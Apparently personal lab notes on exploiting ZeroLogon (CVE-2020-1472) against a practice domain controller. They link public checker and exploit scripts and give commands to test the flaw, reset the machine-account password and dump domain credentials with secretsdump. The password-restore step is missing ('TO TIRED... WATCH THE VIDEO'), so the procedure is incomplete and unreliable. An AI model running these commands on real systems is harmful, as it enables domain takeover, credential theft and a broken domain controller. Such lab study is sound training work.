What is ZeroLogon? - https://www.trendmicro.com/en_us/what-is/zerologon.html

dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472

SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472

---

# Check if the DC is vulnerable

We can use the following python script to check if the DC is vulnerable:
https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py

Run it:
```bash
python3 zerologon_tester.py HYDRA-DC 10.0.0.18
```

# Exploit the vulnerability

Run this python script:
https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py

Run like:
```bash
python3 cve-2020-1472-exploit.py HYDRA-DC 10.0.0.18
```
This exploit should reset the password.

We can test if the exploit was successful by running the following cmd:
```bash
secretsdump.py -just-dc MARVEL/HYDRA-DC\$@10.0.0.18
```

Afterwards restore the password:
TO TIRED... WATCH THE VIDEO